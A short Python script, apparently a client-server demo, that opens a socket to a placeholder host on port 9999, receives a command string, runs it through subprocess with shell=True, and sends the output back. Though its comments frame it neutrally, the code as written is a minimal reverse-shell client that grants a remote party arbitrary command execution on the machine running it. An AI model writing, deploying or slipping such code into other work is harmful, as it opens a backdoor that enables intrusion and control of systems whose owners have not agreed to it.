import socket
import subprocess

# Create a socket object for the client
clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Hostname or IP address of the server
host = 'server_hostname_or_ip'
# Port number the server is listening on
port = 9999

# Connect to the server
clientsocket.connect((host, port))

# Function to execute a command and return its output
def execute_command(command):
    try:
        # Execute the command using subprocess
        result = subprocess.check_output(command, shell=True)
        return result.decode()  # Decode the bytes to string
    except subprocess.CalledProcessError as e:
        return str(e)

# Receive the command from the server and execute it
command = clientsocket.recv(1024).decode()
output = execute_command(command)

# Send the output back to the server
clientsocket.send(output.encode())

# Close the client socket
clientsocket.close()
